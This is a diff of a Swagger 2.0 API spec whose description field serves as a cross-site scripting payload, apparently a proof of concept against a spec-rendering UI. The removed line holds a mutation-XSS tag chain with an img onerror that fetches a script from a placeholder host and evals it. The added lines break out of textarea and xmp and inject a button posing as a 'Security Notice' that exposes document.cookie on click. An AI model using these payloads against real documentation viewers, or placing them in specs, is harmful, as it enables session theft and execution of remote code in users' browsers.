@@ -1,6 +1,11 @@
 swagger: '2.0'
 info:
-  title: Alert Test
-  description: <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://your-host.com/alert.js`).then(res=>res.text()).then(eval)>'></textarea></mtext></svg></mglyph></mtext></math>
-  version: 1.0
+  title: Test API
+  description: |-
+    </textarea></xmp>
+    <style>button {background:red; color:white; padding:12px;}</style>
+    <button onclick="alert(document.domain + '\nCookie: ' + document.cookie)">
+      Security Notice – Click to Continue
+    </button>
+  version: 1.0.0
 paths: {}
